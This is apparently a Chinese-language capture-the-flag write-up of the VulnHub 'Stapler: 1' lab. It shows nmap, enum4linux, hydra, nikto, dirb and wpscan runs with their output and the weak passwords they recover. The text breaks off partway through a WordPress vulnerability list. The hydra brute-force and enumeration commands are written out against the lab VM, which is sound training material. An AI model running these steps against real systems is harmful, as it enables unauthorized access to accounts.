# Stapler: 1

下载地址：

```
https://download.vulnhub.com/stapler/Stapler.zip
```

## 实战操作

需要使用virtualbox导入虚拟机，用VMware打开要设置很多东西，太复杂了。

靶机IP地址：`192.168.0.25`。

扫描靶机端口开放端口。

```
┌──(root💀kali)-[~/Desktop]
└─# nmap -sT -sV -A -O  -p 1-65535 192.168.0.25                                                                                                                                                                                       
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-27 09:01 EST
Nmap scan report for 192.168.0.25
Host is up (0.00088s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.0.26
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
53/tcp    open   domain      dnsmasq 2.75
| dns-nsid: 
|_  bind.version: dnsmasq-2.75
80/tcp    open   http        PHP cli server 5.5 or later
|_http-title: 404 Not Found
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   doom?
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 93
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, ODBCClient, SupportsTransactions, LongPassword, IgnoreSigpipes, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, InteractiveClient, Speaks41ProtocolNew, SupportsCompression, LongColumnFlag, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x13u\x1Epo`\x05\x12p\x17p.\x1Ea\x1Bc\x08\x7Fq:
|_  Auth Plugin Name: mysql_native_password
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tim, we need to-do better next year for Initech

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 154.34 seconds

```

端口扫描知道FTP可以**匿名登录**，测试一下。

获取到三个信息：1、用户名**Harry**；2、匿名登录FTP没有写入权限；3、有一个笔记文本，获取用户名**Elly**和**John**。

```
┌──(root💀kali)-[~/Desktop]
└─# ftp 192.168.0.25      
Connected to 192.168.0.25.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220 
Name (192.168.0.25:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
ftp> put /tmp/test
local: /tmp/test remote: /tmp/test
200 PORT command successful. Consider using PASV.
550 Permission denied.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
ftp> get note
local: note remote: note
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note (107 bytes).
226 Transfer complete.
107 bytes received in 0.00 secs (54.6793 kB/s)

┌──(root💀kali)-[~/Desktop]
└─# cat note 
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.

```

枚举smb用户

```
┌──(root💀kali)-[~/Desktop]
└─# enum4linux -a  192.168.0.25                                                                                                                                                                                                       255 ⨯
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Dec 27 09:15:55 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.0.25
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 192.168.0.25    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================ 
|    Nbtstat Information for 192.168.0.25    |
 ============================================ 
Looking up status of 192.168.0.25
        RED             <00> -         H <ACTIVE>  Workstation Service
        RED             <03> -         H <ACTIVE>  Messenger Service
        RED             <20> -         H <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> H <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> H <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         H <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> H <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================== 
|    Session Check on 192.168.0.25    |
 ===================================== 
[+] Server 192.168.0.25 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for 192.168.0.25    |
 =========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 192.168.0.25    |
 ====================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.0.25 from smbclient: 
[+] Got OS info for 192.168.0.25 from srvinfo:
        RED            Wk Sv PrQ Unx NT SNT red server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ============================= 
|    Users on 192.168.0.25    |
 ============================= 
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 ========================================= 
|    Share Enumeration on 192.168.0.25    |
 ========================================= 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        kathy           Disk      Fred, What are we doing here?
        tmp             Disk      All temporary files should be stored here
        IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            RED

[+] Attempting to map shares on 192.168.0.25
//192.168.0.25/print$   Mapping: DENIED, Listing: N/A
//192.168.0.25/kathy    Mapping: OK, Listing: OK
//192.168.0.25/tmp      Mapping: OK, Listing: OK
//192.168.0.25/IPC$     [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ==================================================== 
|    Password Policy Information for 192.168.0.25    |
 ==================================================== 


[+] Attaching to 192.168.0.25 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] RED
        [+] Builtin

[+] Password Info for Domain: RED

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ============================== 
|    Groups on 192.168.0.25    |
 ============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on 192.168.0.25 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-864226560-67800430-3082388513
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
[+] Enumerating users using SID S-1-5-21-864226560-67800430-3082388513 and logon username '', password ''
S-1-5-21-864226560-67800430-3082388513-513 RED\None (Domain Group)
S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)

 ============================================= 
|    Getting printer info for 192.168.0.25    |
 ============================================= 
No printers returned.

enum4linux complete on Mon Dec 27 09:16:07 2021

```

提取用户名

```
┌──(root💀kali)-[/tmp]
└─# cat users.txt                                            
S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)
                                                                                                                                                                                                                                            
┌──(root💀kali)-[/tmp]
└─# cat users.txt | awk '{print$3}' | awk -F '\\' '{print$2}'
peter
RNunemaker
ETollefson
DSwanger
AParnell
SHayslett
MBassin
JBare
LSolum
IChadwick
MFrei
SStroud
CCeaser
JKanode
CJoo
Eeth
LSolum2
JLipps
jamie
Sam
Drew
jess
SHAY
Taylor
mel
kai
zoe
NATHAN
www
elly

```

使用hydra暴力破解工具进行字典爆破。获取到`SHayslett/SHayslett`；`elly/ylle`。

```
┌──(root💀kali)-[/tmp]
└─# hydra -L users.txt -e nsr 192.168.0.25 ftp                                                                                                                                                                                        255 ⨯
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-27 09:22:56
[DATA] max 16 tasks per 1 server, overall 16 tasks, 90 login tries (l:30/p:3), ~6 tries per task
[DATA] attacking ftp://192.168.0.25:21/
[21][ftp] host: 192.168.0.25   login: SHayslett   password: SHayslett
[21][ftp] host: 192.168.0.25   login: elly   password: ylle
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-27 09:23:18
```

顺便爆破一下SSH服务。找到`SHayslett/SHayslett`。

```
┌──(root💀kali)-[/tmp]
└─# hydra -L users.txt -e nsr 192.168.0.25 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-27 09:28:38
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 90 login tries (l:30/p:3), ~6 tries per task
[DATA] attacking ssh://192.168.0.25:22/
[22][ssh] host: 192.168.0.25   login: SHayslett   password: SHayslett
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-27 09:29:08
```

扫描80端口

```
┌──(root💀kali)-[/tmp]
└─# nikto -h 192.168.0.25 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.0.25
+ Target Hostname:    192.168.0.25
+ Target Port:        80
+ Start Time:         2021-12-27 09:31:57 (GMT-5)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-3093: /.bashrc: User home dir was found with a shell rc file. This may reveal file and path information.
+ OSVDB-3093: /.profile: User home dir with a shell profile was found. May reveal directory information and system configuration.
+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
+ Scan terminated:  20 error(s) and 5 item(s) reported on remote host
+ End Time:           2021-12-27 09:32:04 (GMT-5) (7 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

80端口WEB目录爆破。

```
┌──(root💀kali)-[/tmp]
└─# dirb http://192.168.0.25                                                                                                                                                                                                          255 ⨯

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Dec 27 09:32:54 2021
URL_BASE: http://192.168.0.25/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.0.25/ ----
+ http://192.168.0.25/.bashrc (CODE:200|SIZE:3771)                                                                                                                                                                                         
+ http://192.168.0.25/.profile (CODE:200|SIZE:675)                                                                                                                                                                                         
                                                                                                                                                                                                                                           
-----------------
END_TIME: Mon Dec 27 09:32:56 2021
DOWNLOADED: 4612 - FOUND: 2
```

打开浏览器访问WEB服务，但是没有看到什么有用的信息。

![](<../../.gitbook/assets/image (17) (1) (1) (1) (1).png>)

nc访问666端口，会看到有jpg字符串出现，说明访问这个端口会下载一个文件，使用nc下载文件。

```
┌──(root💀kali)-[/tmp]
└─# nc  192.168.0.25 666 > unkonw.jpg                                                                                                                                                                                                 127 ⨯
                                                                                                                                                                                                                                            
┌──(root💀kali)-[/tmp]
└─# file unkonw.jpg 
unkonw.jpg: Zip archive data, at least v2.0 to extract
                                                                                                                                                                                                                                            
┌──(root💀kali)-[/tmp]
└─# unzip unkonw.jpg 
Archive:  unkonw.jpg
  inflating: message2.jpg     
```

![](<../../.gitbook/assets/image (16) (1) (1).png>)

查看图片文件是否有隐藏信息。

```
┌──(root💀kali)-[/tmp]
└─# strings message2.jpg 
JFIF
vPhotoshop 3.0
8BIM
1If you are reading this, you should get a cookie!
8BIM
$3br
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
        #3R
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
/<}m
>,xr?
u-o[
Sxw]
v;]>
|_m7
l~!|0
<Elu
I[[k:>
>5[^k
;o{o
>xgH
mCXi
PE<R"
umcV
g[Y@=
[\Y_
\Oku
'X|(
?=?i
//Do
1okb
,>,&
n<;oc
*?      xC
~ |y
6{M6
```

访问12380端口

![](<../../.gitbook/assets/image (20) (1) (1) (1).png>)

扫描12380端口的http服务

```
┌──(root💀kali)-[~/Desktop]
└─# nikto -h http://192.168.0.25:12380/                                                                                                                                                                                              127 ⨯
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.0.25
+ Target Hostname:    192.168.0.25
+ Target Port:        12380
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
+ Start Time:         2021-12-28 07:45:48 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'dave' found, with contents: Soemthing doesn't look right here
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Hostname '192.168.0.25' does not match certificate's names: Red.Initech
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 8071 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2021-12-28 07:47:35 (GMT-5) (107 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

nikto在`robots.txt`找到两个路径：`/admin112233/`和`/blogblog/`。http直接访问是没有任何反应的，nikto扫描到有SSL证书，所以需要使用**HTTPS**协议。

![](<../../.gitbook/assets/image (27) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

![](<../../.gitbook/assets/image (21) (1) (1).png>)

这个博客系统是wordpress，扫描一下相关的路径。wpscna需要官网申请APIKEY。

```
┌──(root💀kali)-[~/Desktop]
└─# wpscan --url https://192.168.0.25:12380/blogblog/ --enumerate ap  --disable-tls-checks  --api-token  Npb1aX1Lw5qEK --plugins-detection aggressive                                                 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://192.168.0.25:12380/blogblog/ [192.168.0.25]
[+] Started: Tue Dec 28 08:36:48 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.18 (Ubuntu)
 |  - Dave: Soemthing doesn't look right here
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://192.168.0.25:12380/blogblog/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://192.168.0.25:12380/blogblog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Registration is enabled: https://192.168.0.25:12380/blogblog/wp-login.php?action=register
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: https://192.168.0.25:12380/blogblog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://192.168.0.25:12380/blogblog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).
 | Found By: Rss Generator (Passive Detection)
 |  - https://192.168.0.25:12380/blogblog/?feed=rss2, <generator>http://wordpress.org/?v=4.2.1</generator>
 |  - https://192.168.0.25:12380/blogblog/?feed=comments-rss2, <generator>http://wordpress.org/?v=4.2.1</generator>
 |
 | [!] 88 vulnerabilities identified:
 |
 | [!] Title: WordPress 4.1-4.2.1 - Unauthenticated Genericons Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.2
 |     References:
 |      - https://wpscan.com/vulnerability/21169b6d-61dd-4abc-b77b-167ff5f122ac
 |      - https://codex.wordpress.org/Version_4.2.2
 |
 | [!] Title: WordPress <= 4.2.2 - Authenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.3
 |     References:
 |      - https://wpscan.com/vulnerability/0f027d7d-674b-4a63-9603-25ea68069c1d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5623
 |      - https://wordpress.org/news/2015/07/wordpress-4-2-3/
 |      - https://twitter.com/klikkioy/status/624264122570526720
 |      - https://klikki.fi/adv/wordpress3.html
 |
 | [!] Title: WordPress <= 4.2.3 - wp_untrash_post_comments SQL Injection 
 |     Fixed in: 4.2.4
 |     References:
 |      - https://wpscan.com/vulnerability/b52728fa-c068-4098-b796-ce421f31bde5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2213
 |      - https://github.com/WordPress/WordPress/commit/70128fe7605cb963a46815cf91b0a5934f70eff5
 |
 | [!] Title: WordPress <= 4.2.3 - Timing Side Channel Attack
 |     Fixed in: 4.2.4
 |     References:
 |      - https://wpscan.com/vulnerability/3c4fe98d-04dd-4217-945d-11e06a173916
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5730
 |      - https://core.trac.wordpress.org/changeset/33536
 |
 | [!] Title: WordPress <= 4.2.3 - Widgets Title Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.4
 |     References:
 |      - https://wpscan.com/vulnerability/32787617-081f-4743-a9a7-5dd6642308b2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5732
 |      - https://core.trac.wordpress.org/changeset/33529
 |
 | [!] Title: WordPress <= 4.2.3 - Nav Menu Title Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.4
 |     References:
 |      - https://wpscan.com/vulnerability/4df947ed-d886-4e99-bc8c-b5be1af9844f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5733
 |      - https://core.trac.wordpress.org/changeset/33541
 |
 | [!] Title: WordPress <= 4.2.3 - Legacy Theme Preview Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.4
 |     References:
 |      - https://wpscan.com/vulnerability/7d99fa14-0b94-4e9a-9fc0-d3f22648be4e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5734
 |      - https://core.trac.wordpress.org/changeset/33549
 |      - https://blog.sucuri.net/2015/08/persistent-xss-vulnerability-in-wordpress-explained.html
 |
 | [!] Title: WordPress <= 4.3 - Authenticated Shortcode Tags Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.5
 |     References:
 |      - https://wpscan.com/vulnerability/5c59d5d8-e7aa-4252-b878-d7d3091eeb35
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5714
 |      - https://wordpress.org/news/2015/09/wordpress-4-3-1/
 |      - https://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/
 |      - http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/
 |
 | [!] Title: WordPress <= 4.3 - User List Table Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.5
 |     References:
 |      - https://wpscan.com/vulnerability/0e19f0d4-7d1d-4da8-8314-88df77ce1187
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7989
 |      - https://wordpress.org/news/2015/09/wordpress-4-3-1/
 |      - https://github.com/WordPress/WordPress/commit/f91a5fd10ea7245e5b41e288624819a37adf290a
 |
 | [!] Title: WordPress <= 4.3 - Publish Post & Mark as Sticky Permission Issue
 |     Fixed in: 4.2.5
 |     References:
 |      - https://wpscan.com/vulnerability/1764515d-2232-40a0-931d-0447ce47d045
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5715
 |      - https://wordpress.org/news/2015/09/wordpress-4-3-1/
 |      - https://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/
 |      - http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/
 |
 | [!] Title: WordPress  3.7-4.4 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.6
 |     References:
 |      - https://wpscan.com/vulnerability/09329e59-1871-4eb7-b6ea-fd187cd8db23
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1564
 |      - https://wordpress.org/news/2016/01/wordpress-4-4-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/7ab65139c6838910426567849c7abed723932b87
 |
 | [!] Title: WordPress 3.7-4.4.1 - Local URIs Server Side Request Forgery (SSRF)
 |     Fixed in: 4.2.7
 |     References:
 |      - https://wpscan.com/vulnerability/b19b6a22-3ebf-488d-b394-b578cd23c959
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2222
 |      - https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/36435
 |      - https://hackerone.com/reports/110801
 |
 | [!] Title: WordPress 3.7-4.4.1 - Open Redirect
 |     Fixed in: 4.2.7
 |     References:
 |      - https://wpscan.com/vulnerability/8fba3ea1-553c-4426-ad00-03cc258bff3f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2221
 |      - https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/36444
 |
 | [!] Title: WordPress <= 4.4.2 - SSRF Bypass using Octal & Hexedecimal IP addresses
 |     Fixed in: 4.5
 |     References:
 |      - https://wpscan.com/vulnerability/0810e7fe-7212-49ae-8dd1-75260130b7f5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4029
 |      - https://codex.wordpress.org/Version_4.5
 |      - https://github.com/WordPress/WordPress/commit/af9f0520875eda686fd13a427fd3914d7aded049
 |
 | [!] Title: WordPress <= 4.4.2 - Reflected XSS in Network Settings
 |     Fixed in: 4.5
 |     References:
 |      - https://wpscan.com/vulnerability/238b69c9-4d56-4820-b09f-e778f108faf7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6634
